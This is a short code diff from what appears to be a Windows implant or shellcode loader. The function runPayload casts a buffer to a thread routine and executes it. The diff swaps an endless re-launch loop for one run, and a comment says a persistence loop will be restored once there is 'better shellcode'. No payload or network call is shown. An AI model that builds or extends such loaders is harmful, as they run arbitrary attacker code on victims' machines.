@@ -170,12 +170,15 @@ int runPayload(char* payloadData){
 	int retVal = 0;
 	HANDLE implantHandle = NULL;
 
-	while(TRUE){
+	//do{
 		implantHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payloadData, NULL, 0, 0);
 		CHECK_RETVAL_GLE(retVal, "CreateThread", implantHandle, NULL);
 		DPRINT("New Payload\n");
+
+		Sleep(1000);
 		WaitForSingleObject(implantHandle, INFINITE);
-	}
+	//} while(soft_persist);
+	// I'll add this loop back in once I've got some better shellcode
 
 CLEANUP:
 	SAFE_CLOSEHANDLE(implantHandle);
